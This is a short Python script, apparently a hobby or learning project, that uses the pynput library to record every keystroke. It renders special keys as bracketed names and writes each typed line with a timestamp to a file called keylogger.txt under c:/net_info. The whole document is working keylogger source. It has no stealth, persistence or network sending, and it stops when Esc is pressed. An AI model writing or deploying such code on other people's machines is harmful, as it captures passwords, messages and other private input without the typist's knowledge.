from pynput.keyboard import Key, Listener
import logging

log_dir = 'c:/net_info'
logging.basicConfig(filename=(log_dir + "/keylogger.txt"),
                    level=logging.DEBUG, format='["%(asctime)s"] %(message)s')

tmp_str = ''

def on_press(key):
    global tmp_str
    # #일반 문자
    # if str(key) == str("\"\'\""):
    #     inputKey = "\'"
    # elif key == Key.space:
    #     inputKey = " "
    # else:
    #     inputKey = str(key).replace("'", "")


    try: #일반문자인경우
        key.char
        if str(key) == str("\"\'\""):
            inputKey = "\'"
        elif str(key) == str("\\"):
            inputKey = "\\"
        else:
            inputKey = str(key).replace("'", "")
    except AttributeError: #특수문자인경우
        if key == Key.space:
            inputKey = " "
        else:
            inputKey = str(key).replace("'", "")
            inputKey = "<" +(inputKey.replace("Key.", "")) + ">"
    print(f"{key} --> {inputKey}")
    tmp_str = tmp_str+(inputKey)
    # print(inputKey)
    if key == Key.enter:
        logging.info(f"{tmp_str}")
        tmp_str=''
    if key == Key.esc:
        logging.info(f"{tmp_str}")
        return False


with Listener(on_press=on_press) as listener:
    listener.join()